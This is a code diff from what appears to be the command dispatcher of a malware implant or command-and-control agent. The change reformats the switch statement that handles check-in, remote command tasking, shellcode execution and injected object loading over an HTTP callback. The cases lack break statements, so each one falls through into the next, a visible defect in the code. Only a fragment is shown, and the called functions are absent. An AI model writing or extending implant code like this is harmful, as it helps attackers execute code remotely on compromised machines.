@@ -192,7 +192,6 @@ namespace Dispatcher {
             }
         }
 
-        // todo: clarify what this is supposed to be
 #ifdef TRANSPORT_HTTP
         Network::Http::HttpCallback(out, &in);
 #endif
@@ -249,18 +248,10 @@ namespace Dispatcher {
         auto msg_type = Parser::UnpackDword(&parser);
         switch (msg_type) {
 
-            case TypeCheckin: {
-                Ctx->session.checkin = TRUE;
-            }
-            case TypeTasking: {
-                Memory::Execute::ExecuteCommand(parser);
-            }
-            case TypeExecute: {
-                Memory::Execute::ExecuteShellcode(parser);
-            }
-            case TypeObject: {
-                Injection::LoadObject(parser);
-            }
+            case TypeCheckin:   Ctx->session.checkin = TRUE;
+            case TypeTasking:   Memory::Execute::ExecuteCommand(parser);
+            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser);
+            case TypeObject:    Injection::LoadObject(parser);
 
             default:
                 break;
